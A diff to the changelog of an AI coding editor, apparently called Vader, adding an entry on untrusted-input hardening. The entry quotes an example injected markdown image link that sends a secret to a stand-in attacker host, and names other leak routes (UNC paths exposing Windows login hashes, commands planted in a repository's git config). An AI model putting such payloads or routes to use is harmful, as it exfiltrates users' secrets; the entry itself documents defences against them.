@@ -21,6 +21,12 @@
     long...) instead of `[UNKNOWN] ...`; an empty model reply is explained instead of ending silently.
   - *Edits right after a file changed on disk* could not be saved ("file modified since"); an unmodified open file is re-read first.
   - Tool arguments sent as strings or `null`, `file://` URLs, CRLF files and an edit whose ORIGINAL text is missing are covered by tests.
+- **Untrusted-input hardening** (found by looking for the unexpected route, written up in `docs/integrations/untrusted-input.md`, each with a test):
+  chat markdown no longer fetches web images by itself (an injected `![](https://attacker/?d=SECRET)` could leak data) and only follows http/https/mailto
+  links; file tools refuse `\\host\share`, `//host/share` and `file://host/...` (Windows would send the login hash); every git call Vader makes by itself ignores
+  programs named in a repository's `.git/config` (a prepared folder could run a command on the first `git diff`) and its hooks; Export Settings no longer
+  writes API keys, and Import Settings never moves a key to a different endpoint; a tool request restored from disk or an imported chat is checked against
+  the hard policy again before it runs; the unused Tunnel Forwarding extension (needs Microsoft's tunnel service and a CLI Vader does not ship) is gone.
 - **Inherited leftovers removed:** the two bundled Remote-SSH / Remote-WSL extensions (they could not work with Microsoft's remote server), the
   "Use AI Features with Copilot for free..." palette command, the Accounts icon (starts hidden; Microsoft/GitHub sign-in only), and a crash in
   *One-Click Switch* when the source editor had no extensions folder.
